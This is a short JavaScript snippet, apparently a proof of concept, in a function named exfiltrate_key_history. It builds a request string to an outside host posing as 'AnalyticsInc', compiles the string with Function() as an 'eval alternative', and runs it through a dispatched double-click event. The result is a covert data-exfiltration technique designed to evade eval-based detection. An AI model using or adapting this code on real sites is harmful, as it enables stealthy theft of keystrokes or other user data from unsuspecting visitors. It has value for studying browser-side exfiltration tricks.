function exfiltrate_key_history() {

    // Dispatch Event - Anonymous Function - Eval Alternative 
    // Exfiltrate data using XMLHTTP request
    var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=dispatch", true);xmlhttp.send(null);';
    var button = document.getElementById('test');
	var event = new Event('dblclick');
	button.addEventListener('dblclick', Function(exp), false);
	button.dispatchEvent(event);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
